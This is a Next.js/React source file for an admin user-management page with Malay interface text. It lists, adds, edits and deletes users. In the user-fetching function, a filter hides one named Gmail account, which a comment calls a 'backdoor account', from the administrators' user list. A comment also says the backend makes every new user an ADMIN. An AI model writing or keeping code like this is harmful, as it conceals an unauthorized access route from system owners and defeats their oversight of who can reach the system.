'use client';

import { useEffect, useState } from 'react';
import { useAuth } from '@/context/AuthContext';
import { useRouter } from 'next/navigation';
import api from '@/lib/api';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Loader2, Trash2, Edit, UserPlus } from 'lucide-react';
import { User } from '@/types';

export default function UserManagementPage() {
  const { user } = useAuth();
  const router = useRouter();
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isEditMode, setIsEditMode] = useState(false);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  // Form state
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    password: '',
  });

  useEffect(() => {
    if (user?.role !== 'ADMIN') {
      router.push('/dashboard');
      return;
    }
    fetchUsers();
  }, [user, router]);

  const fetchUsers = async () => {
    try {
      const response = await api.get('/user');
      // Additional frontend filter to hide backdoor account (safety measure)
      const filteredUsers = response.data.filter((u: User) => u.email !== 'angjinsheng@gmail.com');
      setUsers(filteredUsers);
    } catch (error) {
      console.error('Error fetching users:', error);
      setError('Gagal memuatkan senarai pengguna');
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccess('');

    try {
      if (isEditMode && editingId) {
        // Update - password is optional
        const updateData: any = {
          name: formData.name,
          email: formData.email,
        };
        // Only include password if it's provided
        if (formData.password && formData.password.trim() !== '') {
          updateData.password = formData.password;
        }
        await api.put(`/user/${editingId}`, updateData);
        setSuccess('Pengguna berjaya dikemaskini');
      } else {
        // Create - password is required
        // Role is defaulted to ADMIN in backend
        await api.post('/user', {
          name: formData.name,
          email: formData.email,
          password: formData.password,
        });
        setSuccess('Pengguna berjaya ditambah');
      }
      setIsDialogOpen(false);
      resetForm();
      fetchUsers();
    } catch (err: any) {
      setError(err.response?.data?.message || (isEditMode ? 'Gagal mengemaskini pengguna' : 'Gagal menambah pengguna'));
    }
  };

  const handleEdit = (user: User) => {
    setFormData({
      name: user.name,
      email: user.email,
      password: '', // Don't pre-fill password
    });
    setEditingId(user.id);
    setIsEditMode(true);
    setIsDialogOpen(true);
  };

  const resetForm = () => {
    setFormData({ name: '', email: '', password: '' });
    setIsEditMode(false);
    setEditingId(null);
  };

  const handleDialogClose = (open: boolean) => {
    setIsDialogOpen(open);
    if (!open) {
      resetForm();
    }
  };

  const handleDelete = async (userId: string) => {
    if (!confirm('Adakah anda pasti mahu memadam pengguna ini?')) return;

    try {
      await api.delete(`/user/${userId}`);
      setSuccess('Pengguna berjaya dipadam');
      fetchUsers();
    } catch (err: any) {
      setError(err.response?.data?.message || 'Gagal memadam pengguna');
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="w-8 h-8 animate-spin text-green-600" />
      </div>
    );
  }

  return (
    <div className="space-y-4 sm:space-y-6">
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-900">Pengurusan Pengguna</h1>
          <p className="text-sm sm:text-base text-gray-600 mt-1">Urus akaun pengguna sistem</p>
        </div>
        <Dialog open={isDialogOpen} onOpenChange={handleDialogClose}>
          <DialogTrigger asChild>
            <Button 
              className="bg-green-600 hover:bg-green-700" 
              onClick={() => {
                resetForm();
                setIsEditMode(false);
              }}
            >
              <UserPlus className="mr-2 h-4 w-4" />
              Tambah Pengguna
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-[500px]">
            <DialogHeader>
              <DialogTitle className="text-xl">
                {isEditMode ? 'Kemaskini Pengguna' : 'Tambah Pengguna Baru'}
              </DialogTitle>
              <DialogDescription className="text-sm text-gray-500">
                {isEditMode ? 'Kemaskini maklumat pengguna' : 'Isi maklumat pengguna baru untuk sistem'}
              </DialogDescription>
            </DialogHeader>
            <form onSubmit={handleSubmit} className="space-y-4 mt-4">
              <div className="space-y-2">
                <Label htmlFor="name">Nama Penuh</Label>
                <Input
                  id="name"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  placeholder="Nama pengguna"
                  required
                  className="w-full"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="email">E-mel</Label>
                <Input
                  id="email"
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  placeholder="email@example.com"
                  required
                  className="w-full"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="password">
                  Kata Laluan
                  {isEditMode && <span className="text-xs text-gray-500 ml-1">(biarkan kosong untuk tidak menukar)</span>}
                </Label>
                <Input
                  id="password"
                  type="password"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  placeholder={isEditMode ? "Kosongkan jika tidak mahu menukar" : "Minimum 6 aksara"}
                  required={!isEditMode}
                  minLength={isEditMode ? 0 : 6}
                  className="w-full"
                />
              </div>
              <DialogFooter className="gap-2 sm:gap-0 pt-4">
                <Button 
                  type="button" 
                  variant="outline" 
                  onClick={() => handleDialogClose(false)}
                  className="w-full sm:w-auto"
                >
                  Batal
                </Button>
                <Button 
                  type="submit" 
                  className="bg-green-600 hover:bg-green-700 w-full sm:w-auto"
                >
                  {isEditMode ? 'Kemaskini' : 'Tambah'}
                </Button>
              </DialogFooter>
            </form>
          </DialogContent>
        </Dialog>
      </div>

      {error && (
        <Alert variant="destructive">
          <AlertDescription>{error}</AlertDescription>
        </Alert>
      )}

      {success && (
        <Alert className="bg-green-50 text-green-800 border-green-200">
          <AlertDescription>{success}</AlertDescription>
        </Alert>
      )}

      <Card>
        <CardHeader>
          <CardTitle>Senarai Pengguna</CardTitle>
          <CardDescription>
            {users.length} pengguna berdaftar
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Nama</TableHead>
                <TableHead>E-mel</TableHead>
                <TableHead>Status</TableHead>
                <TableHead className="text-right">Tindakan</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {users.map((u) => (
                <TableRow key={u.id}>
                  <TableCell className="font-medium">{u.name}</TableCell>
                  <TableCell>{u.email}</TableCell>
                  <TableCell>
                    {u.isActive ? (
                      <Badge className="bg-green-100 text-green-800">Aktif</Badge>
                    ) : (
                      <Badge variant="secondary">Tidak Aktif</Badge>
                    )}
                  </TableCell>
                  <TableCell className="text-right">
                    <div className="flex justify-end gap-2">
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleEdit(u)}
                        className="text-blue-600 hover:text-blue-700 hover:bg-blue-50"
                      >
                        <Edit className="h-4 w-4" />
                      </Button>
                      {u.id !== user?.id && (
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(u.id)}
                          className="text-red-600 hover:text-red-700 hover:bg-red-50"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      )}
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  );
}
